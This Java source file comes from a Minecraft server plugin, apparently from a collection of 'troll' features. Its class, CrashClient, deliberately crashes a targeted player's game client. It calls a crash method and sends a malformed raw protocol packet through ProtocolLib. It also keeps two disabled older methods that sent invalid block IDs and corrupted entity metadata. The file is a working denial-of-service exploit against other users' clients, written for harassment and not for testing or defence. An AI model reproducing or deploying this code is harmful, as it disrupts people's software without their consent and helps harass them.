package net.octopvp.octocore.paper.utils.trolls;

import com.comphenix.protocol.ProtocolLibrary;
import com.comphenix.protocol.events.PacketContainer;
import io.netty.buffer.ByteBuf;
import lombok.Getter;
import net.minecraft.server.v1_8_R3.*;
import net.octopvp.octocore.paper.utils.runnable.Tasks;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.lang.reflect.InvocationTargetException;

/**
 * Actually crashes the client pog
 */
public class CrashClient implements Troll {
    @Getter
    private static final CrashClient instance = new CrashClient();

    private CrashClient() {
    }

    @Override
    public void activate(Player target) {
        /*
        Random random = new Random(System.currentTimeMillis());
        for (int i = 0; i < 10; i++) {
            target.sendBlockChange(target.getLocation(), random.nextInt(2674) - 1337, (byte) 0);
        }
        target.sendBlockChange(target.getLocation(), -6666, (byte) 0);
        target.sendBlockChange(target.getLocation(), 6666, (byte) 0);
           */

        if (false) {
            final EntityPlayer px = ((CraftPlayer) target).getHandle();
            final EntityCreeper entity = new EntityCreeper(px.world);

            final DataWatcher dw = new DataWatcher(entity);
            dw.a(18, (Object) Integer.MAX_VALUE);

            PacketPlayOutSpawnEntityLiving spawn = new PacketPlayOutSpawnEntityLiving(entity);

            px.playerConnection.sendPacket(spawn);
            //should wait 5 ticks
            Tasks.runLater(() -> {
                PacketPlayOutEntityMetadata meta = new PacketPlayOutEntityMetadata(entity.getId(), dw, true);
                px.playerConnection.sendPacket(meta);
            }, 5);
        }

        target.crashClient();
        final ByteBuf buf = PacketContainer.createPacketBuffer();
        buf.writeInt(-5);
        byte[] bytes = new byte[buf.readableBytes()];
        buf.readBytes(bytes);
        buf.release();
        try {
            ProtocolLibrary.getProtocolManager().sendWirePacket(
                    target,
                    0x3a,
                    bytes
            );
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        }
    }
}
